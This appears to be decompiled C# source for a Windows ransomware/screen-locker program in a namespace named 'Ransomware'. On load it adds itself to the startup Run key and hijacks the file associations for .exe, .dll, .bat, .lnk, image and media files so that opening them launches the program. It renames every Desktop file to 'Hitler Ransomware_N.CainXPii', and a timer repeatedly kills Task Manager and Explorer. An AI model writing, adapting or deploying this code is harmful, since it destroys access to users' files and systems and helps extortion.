using System;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Ransomware.My;

namespace Ransomware;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((ApplicationSettingsBase)MySettingsProperty.Settings).Reload();
		if (Operators.CompareString(MySettingsProperty.Settings.Startup, "false", false) == 0)
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
				MySettingsProperty.Settings.Startup = "true";
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				MySettingsProperty.Settings.Startup = "false";
				ProjectData.ClearProjectError();
			}
		}
		Timer1.Start();
		checked
		{
			try
			{
				string text = ".exe";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				string text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".dll";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".mp3";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".mp4";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".reg";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".bat";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".vbs";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".cmd";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".png";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".jpg";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".jpeg";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
				text = ".lnk";
				if (!text.StartsWith("."))
				{
					text = "." + text;
				}
				text2 = text.Substring(1, text.Length - 1);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
					.SetValue("", text2, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text2 + "\\shell\\open\\command")
					.SetValue("", Assembly.GetExecutingAssembly().Location + " \"%l\" ", RegistryValueKind.String);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			((Control)MyProject.Forms.Form2).Show();
			string desktop = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();
			string searchPattern = "*.*";
			int num = 0;
			string[] files = Directory.GetFiles(desktop, searchPattern, SearchOption.AllDirectories);
			foreach (string path in files)
			{
				File.Move(Path.Combine(desktop, path), Path.Combine(desktop, "Hitler Ransomware_" + Conversions.ToString(num) + ".CainXPii"));
				num++;
			}
			string desktop2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();
			string searchPattern2 = "*.*";
			int num2 = 0;
			string[] files2 = Directory.GetFiles(desktop2, searchPattern2, SearchOption.AllDirectories);
			foreach (string path2 in files2)
			{
				File.Move(Path.Combine(desktop2, path2), Path.Combine(desktop2, "Hitler Ransomware_" + Conversions.ToString(num) + ".CainXPii"));
				num2++;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		((Control)this).set_Name("taskmgr");
		Process[] processesByName = Process.GetProcessesByName("taskmgr");
		foreach (Process process in processesByName)
		{
			try
			{
				process.Kill();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		((Control)this).set_Name("exlorer");
		Process[] processesByName2 = Process.GetProcessesByName("explorer");
		foreach (Process process2 in processesByName2)
		{
			try
			{
				process2.Kill();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		Timer1.set_Interval(600);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(16f, 31f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}
}
